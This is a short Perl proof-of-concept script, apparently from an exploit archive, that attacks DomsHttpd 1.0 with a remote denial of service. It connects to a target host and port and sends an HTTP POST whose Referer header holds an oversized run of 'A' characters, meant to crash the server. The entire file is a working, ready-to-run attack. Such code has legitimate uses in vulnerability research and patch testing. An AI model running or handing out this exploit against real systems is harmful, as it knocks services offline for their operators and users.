#!/usr/bin/perl

# DomsHttpd 1.0 <= Remote Denial Of Service Exploit

# Credit: Jean Pascal Pereira <pereira@secbiz.de>

# Usage: domshttpd.pl [host] [port]

use strict;
use warnings;
use IO::Socket;

my $host = shift || "localhost";
my $port = shift || 88;

my $sock = IO::Socket::INET->new( Proto => "tcp",
                                  PeerAddr  => $host,
                                  PeerPort  => $port
);


my $junk = "A"x3047;

print $sock "POST / HTTP/1.1\r\nHost: ".$host."\r\nConnection: close\r\nUser-Agent: Mozilla\r\nReferer: http://".$host."/".$junk."\r\n\r\n";

sleep 4;

close($sock);